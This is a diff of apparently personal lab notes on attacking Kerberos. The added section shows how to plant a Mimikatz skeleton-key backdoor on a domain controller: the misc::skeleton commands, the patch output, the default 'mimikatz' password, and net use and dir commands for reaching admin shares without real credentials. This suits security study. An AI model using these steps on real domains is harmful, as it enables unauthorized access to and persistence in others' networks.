@@ -1046,7 +1046,7 @@ User : Administrator
 Kerberos Backdoors with Mimikatz
 ============================================================================================================================================
 
-**TLDR** *mimikatz can create and use a skeleton Key to access the domain forest*
+**TLDR** *mimikatz can create and use a skeleton Key to access the domain forest and is more subtle than a G/S ticket attack*
 
 Implanting itself into the memory of the domain forest (similar to a rootkit) the Kerberos Backdoor with mimikatz, by creating and using a skeleton Key, can exploit the way th AS-REQ validates encrypted timestamps. It only works using Kerberos RC4 encryption.
 
@@ -1059,4 +1059,50 @@ The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF
 - DC tries to decrypt the timestamp with both user NT hash and skeleton key NT hash
 - Allowing access to the Domain Forest
 
+### Useage
+*must be run as admin*
+
+`mimikatz.exe` - to run mimikatz on target
+
+`privilege::debug` - To make sure we have local run as admin access
+
+`misc::skeleton` - Creates a skeleton key *BOOM*
+
+```
+mimikatz # misc::skeleton 
+[KDC] data             
+[KDC] struct           
+[KDC] keys patch OK    
+[RC4] functions        
+[RC4] init patch OK    
+[RC4] decrypt patch OK 
+                       
+```
+
+### Accessing the forest  
+
+default credentials: `mimikatz`
+
+`net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz` - The share will now be accessible without the need for the Administrators password
+
+`dir \\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
+
+The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.
+
+Conclusion
+============================================================================================================================================
+
+### Things to do in the future
+- Make a personal lab with multiple machines in order to further test attacking kerberos since this lab was only a single machine and some was just theory
+
+### Links
+
+- https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
+- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
+- https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
+- https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
+- https://www.varonis.com/blog/kerberos-authentication-explained/
+- https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
+- https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
+- https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf
 
